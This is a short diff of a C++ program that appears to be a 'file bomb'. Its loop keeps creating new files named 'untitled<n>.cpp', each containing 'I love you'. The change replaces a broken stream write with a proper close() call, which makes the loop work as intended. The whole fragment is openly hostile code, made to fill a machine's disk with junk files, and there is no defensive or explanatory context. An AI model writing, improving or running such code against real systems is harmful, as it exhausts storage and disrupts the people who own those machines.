@@ -6,7 +6,7 @@ using namespace std;
 	while (i++){
 	ofstream bomb("untitled"+to_string(i)+".cpp");
 	bomb<<"I love you";
-	bomb<<"close";
+	bomb.close();
 	}
 	return 0;
 }
